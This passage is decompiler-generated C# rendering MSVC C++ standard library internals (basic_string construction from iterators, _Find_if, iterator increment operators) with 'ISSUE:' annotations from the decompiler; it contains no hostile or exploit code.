    basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E** _Dest,
    allocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u002A\u003E* _Al)
  {
    uint num1 = (uint) ((IntPtr) _Last - (IntPtr) _First >> 2);
    int num2 = (int) num1 * 4;
    IntPtr num3 = num2 + (IntPtr) _Dest;
    if (num1 <= 0U)
      return (basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E**) num3;
    \u003CModule\u003E.memmove_s((void*) _Dest, (uint) num2, (void*) _First, (uint) num2);
    return (basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E**) num3;
  }

  internal static unsafe reverse_iterator\u003Cchar\u0020\u002A\u003E* std\u002E_Find_if\u003Cclass\u0020std\u003A\u003Areverse_iterator\u003Cchar\u0020\u002A\u003E\u002Cclass\u0020std\u003A\u003Aunary_negate\u003Cclass\u0020std\u003A\u003Apointer_to_unary_function\u003Cint\u002Cint\u002Cint\u0020\u0028__cdecl\u002A\u0029\u0028int\u0029\u003E\u0020\u003E\u0020\u003E(
    [In] reverse_iterator\u003Cchar\u0020\u002A\u003E* obj0,
    reverse_iterator\u003Cchar\u0020\u002A\u003E _First,
    reverse_iterator\u003Cchar\u0020\u002A\u003E _Last,
    unary_negate\u003Cstd\u003A\u003Apointer_to_unary_function\u003Cint\u002Cint\u002Cint\u0020\u0028__cdecl\u002A\u0029\u0028int\u0029\u003E\u0020\u003E _Pred)
  {
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    while (^(int&) ref _First != ^(int&) ref _Last)
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      int num = (int) *(sbyte*) (^(int&) ref _First - 1);
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      if (__calli((__FnPtr<int (int)>) ^(int&) ref _Pred)(num) != 0)
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ref _First = ^(int&) ref _First - 1;
      }
      else
        break;
    }
    // ISSUE: cpblk instruction
    __memcpy((IntPtr) obj0, ref _First, 4);
    return obj0;
  }

  internal static unsafe void std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Construct\u003Cclass\u0020std\u003A\u003A_Vector_iterator\u003Cwchar_t\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E(
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _First,
    _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _Last,
    forward_iterator_tag __unnamed002)
  {
    // ISSUE: untyped stack allocation
    int num1 = (int) __untypedstackalloc(\u003CModule\u003E.__CxxQueryExceptionSize());
    _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT1 = _Last;
    _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT2 = _First;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if ((^(int&) ref _Last != 0 ? 1 : 0) == 0 || ^(int&) ref _Last != ^(int&) ref _First)
      \u003CModule\u003E._invalid_parameter_noinfo();
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    uint num2 = (uint) (^(int&) ((IntPtr) &stdAllocatorWcharT1 + 4) - ^(int&) ((IntPtr) &stdAllocatorWcharT2 + 4) >> 1);
    \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Ereserve(obj0, num2);
    try
    {
      while (\u003CModule\u003E.std\u002E_Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u0021\u003D((_Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E*) &_First, (_Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E*) &_Last))
      {
        char* chPtr = \u003CModule\u003E.std\u002E_Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u002A(&_First);
        \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Eappend(obj0, 1U, *chPtr);
        \u003CModule\u003E.std\u002E_Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u002B\u002B(&_First);
      }
    }
    catch (Exception ex1) when (
    {
      // ISSUE: unable to correctly present filter
      uint exceptionCode = (uint) Marshal.GetExceptionCode();
      if (\u003CModule\u003E.__CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) 0, 0, (void*) 0) != 0)
      {
        SuccessfulFiltering;
      }
      else
        throw;
    }
    )
    {
      uint num3 = 0;
      \u003CModule\u003E.__CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) num1);
      try
      {
        try
        {
          \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Tidy(obj0, true, 0U);
          \u003CModule\u003E._CxxThrowException((void*) 0, (_s__ThrowInfo*) 0);
        }
        catch (Exception ex2) when (
        {
          // ISSUE: unable to correctly present filter
          num3 = (uint) \u003CModule\u003E.__CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
          if (num3 != 0U)
          {
            SuccessfulFiltering;
          }
          else
            throw;
        }
        )
        {
        }
        if (num3 == 0U)
          return;
        throw;
      }
      finally
      {
        \u003CModule\u003E.__CxxUnregisterExceptionObject((void*) num1, (int) num3);
      }
    }
  }

  internal static unsafe void std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Construct\u003Cclass\u0020std\u003A\u003A_String_iterator\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u0020\u003E(
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E _First,
    _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E _Last,
    forward_iterator_tag __unnamed002)
  {
    // ISSUE: untyped stack allocation
    int num1 = (int) __untypedstackalloc(\u003CModule\u003E.__CxxQueryExceptionSize());
    _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar1 = _First;
    _String_const_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar2 = (_String_const_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E) _Last;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if (^(int&) ref _Last != -4 && ((^(int&) ref _Last != 0 ? 1 : 0) == 0 || ^(int&) ref _Last != ^(int&) ref _First))
      \u003CModule\u003E._invalid_parameter_noinfo();
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    uint num2 = (uint) (^(int&) ((IntPtr) &stdAllocatorChar2 + 4) - ^(int&) ((IntPtr) &stdAllocatorChar1 + 4));
    \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Ereserve(obj0, num2);
    try
    {
      while (\u003CModule\u003E.std\u002E_String_const_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u0021\u003D((_String_const_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E*) &_First, (_String_const_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E*) &_Last))
      {
        sbyte* numPtr = \u003CModule\u003E.std\u002E_String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u002A(&_First);
        \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Eappend(obj0, 1U, (char) *numPtr);
        \u003CModule\u003E.std\u002E_String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u002B\u002B(&_First);
      }
    }
    catch (Exception ex1) when (
    {
      // ISSUE: unable to correctly present filter
      uint exceptionCode = (uint) Marshal.GetExceptionCode();
      if (\u003CModule\u003E.__CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) 0, 0, (void*) 0) != 0)
      {
        SuccessfulFiltering;
      }
      else
        throw;
    }
    )
    {
      uint num3 = 0;
      \u003CModule\u003E.__CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) num1);
      try
      {
        try
        {
          \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Tidy(obj0, true, 0U);
          \u003CModule\u003E._CxxThrowException((void*) 0, (_s__ThrowInfo*) 0);
        }
        catch (Exception ex2) when (
        {
          // ISSUE: unable to correctly present filter
          num3 = (uint) \u003CModule\u003E.__CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
          if (num3 != 0U)
          {
            SuccessfulFiltering;
          }
          else
            throw;
        }
        )
        {
        }
        if (num3 == 0U)
          return;
        throw;
      }
      finally
      {
        \u003CModule\u003E.__CxxUnregisterExceptionObject((void*) num1, (int) num3);
      }
    }
  }

  internal static unsafe void std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E_Construct\u003Cclass\u0020std\u003A\u003Aistreambuf_iterator\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u0020\u003E(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    istreambuf_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E _First,
    istreambuf_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E _Last,
    input_iterator_tag __unnamed002)
  {
    // ISSUE: untyped stack allocation
    int num1 = (int) __untypedstackalloc(\u003CModule\u003E.__CxxQueryExceptionSize());
    try
    {
      while (\u003CModule\u003E.std\u002Eoperator\u0021\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(&_First, &_Last))
      {
        \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Eappend(obj0, 1U, \u003CModule\u003E.std\u002Eistreambuf_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E\u002A(&_First));
        \u003CModule\u003E.std\u002Eistreambuf_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E\u002B\u002B(&_First);
      }
    }
    catch (Exception ex1) when (
    {
      // ISSUE: unable to correctly present filter
      uint exceptionCode = (uint) Marshal.GetExceptionCode();
      if (\u003CModule\u003E.__CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) 0, 0, (void*) 0) != 0)
      {
        SuccessfulFiltering;
      }
      else
        throw;
    }
    )
    {
      uint num2 = 0;
      \u003CModule\u003E.__CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) num1);
      try
      {
        try
        {
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E_Tidy(obj0, true, 0U);
          \u003CModule\u003E._CxxThrowException((void*) 0, (_s__ThrowInfo*) 0);
        }
        catch (Exception ex2) when (
        {
          // ISSUE: unable to correctly present filter
          num2 = (uint) \u003CModule\u003E.__CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
          if (num2 != 0U)
          {
            SuccessfulFiltering;
          }
          else
            throw;
        }
        )
        {
        }
        if (num2 == 0U)
          return;
        throw;
      }
      finally
      {
        \u003CModule\u003E.__CxxUnregisterExceptionObject((void*) num1, (int) num2);
      }
    }
  }

  internal static unsafe void std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E_Construct\u003Cclass\u0020std\u003A\u003A_String_iterator\u003Cwchar_t\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    _String_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _First,
    _String_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _Last,
    forward_iterator_tag __unnamed002)
  {
    // ISSUE: untyped stack allocation
    int num1 = (int) __untypedstackalloc(\u003CModule\u003E.__CxxQueryExceptionSize());
    _String_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT1 = _First;
    _String_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT2 = (_String_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E) _Last;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if (^(int&) ref _Last != -4 && ((^(int&) ref _Last != 0 ? 1 : 0) == 0 || ^(int&) ref _Last != ^(int&) ref _First))
      \u003CModule\u003E._invalid_parameter_noinfo();
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    uint num2 = (uint) (^(int&) ((IntPtr) &stdAllocatorWcharT2 + 4) - ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 4) >> 1);
    \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ereserve(obj0, num2);
    try
    {
      while (\u003CModule\u003E.std\u002E_String_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u0021\u003D((_String_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E*) &_First, (_String_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E*) &_Last))
      {
        char* chPtr = \u003CModule\u003E.std\u002E_String_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u002A(&_First);
        \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Eappend(obj0, 1U, (sbyte) *chPtr);
        \u003CModule\u003E.std\u002E_String_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u002B\u002B(&_First);
      }
    }
    catch (Exception ex1) when (
    {
      // ISSUE: unable to correctly present filter
      uint exceptionCode = (uint) Marshal.GetExceptionCode();
      if (\u003CModule\u003E.__CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) 0, 0, (void*) 0) != 0)
      {
        SuccessfulFiltering;
      }
      else
        throw;
    }
    )
    {
      uint num3 = 0;
      \u003CModule\u003E.__CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) num1);
      try
      {
        try
        {
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E_Tidy(obj0, true, 0U);
          \u003CModule\u003E._CxxThrowException((void*) 0, (_s__ThrowInfo*) 0);
        }
        catch (Exception ex2) when (
        {
          // ISSUE: unable to correctly present filter
          num3 = (uint) \u003CModule\u003E.__CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
          if (num3 != 0U)
          {
            SuccessfulFiltering;
          }
          else
            throw;
        }
        )
        {
        }
        if (num3 == 0U)
          return;
        throw;
      }
      finally
      {
        \u003CModule\u003E.__CxxUnregisterExceptionObject((void*) num1, (int) num3);
      }
    }
  }

  internal static unsafe void std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E_Construct\u003Cclass\u0020std\u003A\u003A_Vector_iterator\u003Cwchar_t\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _First,
    _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _Last,
    forward_iterator_tag __unnamed002)
  {
    // ISSUE: untyped stack allocation
    int num1 = (int) __untypedstackalloc(\u003CModule\u003E.__CxxQueryExceptionSize());
    _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT1 = _Last;
    _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT2 = _First;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if ((^(int&) ref _Last != 0 ? 1 : 0) == 0 || ^(int&) ref _Last != ^(int&) ref _First)
      \u003CModule\u003E._invalid_parameter_noinfo();
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    uint num2 = (uint) (^(int&) ((IntPtr) &stdAllocatorWcharT1 + 4) - ^(int&) ((IntPtr) &stdAllocatorWcharT2 + 4) >> 1);
    \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ereserve(obj0, num2);
    try
    {
      while (\u003CModule\u003E.std\u002E_Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u0021\u003D((_Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E*) &_First, (_Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E*) &_Last))
      {
        char* chPtr = \u003CModule\u003E.std\u002E_Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u002A(&_First);
        \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Eappend(obj0, 1U, (sbyte) *chPtr);
        \u003CModule\u003E.std\u002E_Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u002B\u002B(&_First);
      }
    }
    catch (Exception ex1) when (
    {
      // ISSUE: unable to correctly present filter
      uint exceptionCode = (uint) Marshal.GetExceptionCode();
      if (\u003CModule\u003E.__CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) 0, 0, (void*) 0) != 0)
      {
        SuccessfulFiltering;
      }
      else
        throw;
    }
    )
    {
      uint num3 = 0;
      \u003CModule\u003E.__CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) num1);
      try
      {
        try
        {
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E_Tidy(obj0, true, 0U);
          \u003CModule\u003E._CxxThrowException((void*) 0, (_s__ThrowInfo*) 0);
        }
        catch (Exception ex2) when (
        {
          // ISSUE: unable to correctly present filter
          num3 = (uint) \u003CModule\u003E.__CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
          if (num3 != 0U)
          {
            SuccessfulFiltering;
          }
          else
            throw;
        }
        )
        {
        }
        if (num3 == 0U)
          return;
        throw;
      }
      finally
      {
        \u003CModule\u003E.__CxxUnregisterExceptionObject((void*) num1, (int) num3);
      }
    }
  }

  internal static unsafe _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* std\u002E_String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u002B\u002B(
    [In] _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0)
  {
    int num;
    switch ((uint) *(int*) obj0)
    {
      case 0:
        num = 0;
        break;
      case 4294967292:
label_7:
        *(int*) ((IntPtr) obj0 + 4) = *(int*) ((IntPtr) obj0 + 4) + 1;
        return obj0;
      default:
        num = 1;
        break;
    }
    if ((byte) num == (byte) 0)
      \u003CModule\u003E._invalid_parameter_noinfo();
    if ((UIntPtr) *(int*) ((IntPtr) obj0 + 4) >= (UIntPtr) (\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E_Myptr((basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E*) *(int*) obj0) + *(int*) (*(int*) obj0 + 20)))
    {
      \u003CModule\u003E._invalid_parameter_noinfo();
      goto label_7;
    }
    else
      goto label_7;
  }

  internal static unsafe _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* std\u002E_Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u002B\u002B(
    [In] _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0)
  {
    if ((*(int*) obj0 != 0 ? 1 : 0) == 0)
      \u003CModule\u003E._invalid_parameter_noinfo();
    uint num = (uint) *(int*) obj0;
    _Container_base_aux* containerBaseAuxPtr = num == 0U ? (_Container_base_aux*) 0 : (_Container_base_aux*) *(int*) num;
    if ((uint) *(int*) ((IntPtr) obj0 + 4) >= (uint) *(int*) ((IntPtr) containerBaseAuxPtr + 16))
      \u003CModule\u003E._invalid_parameter_noinfo();
    *(int*) ((IntPtr) obj0 + 4) = *(int*) ((IntPtr) obj0 + 4) + 2;
    return obj0;
  }

  internal static unsafe _String_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* std\u002E_String_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u002B\u002B(
    [In] _String_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0)
  {
    int num;
    switch ((uint) *(int*) obj0)
    {
      case 0:
        num = 0;
        break;
      case 4294967292:
label_7:
        *(int*) ((IntPtr) obj0 + 4) = *(int*) ((IntPtr) obj0 + 4) + 2;
        return obj0;
      default:
        num = 1;
        break;
    }
    if ((byte) num == (byte) 0)
      \u003CModule\u003E._invalid_parameter_noinfo();
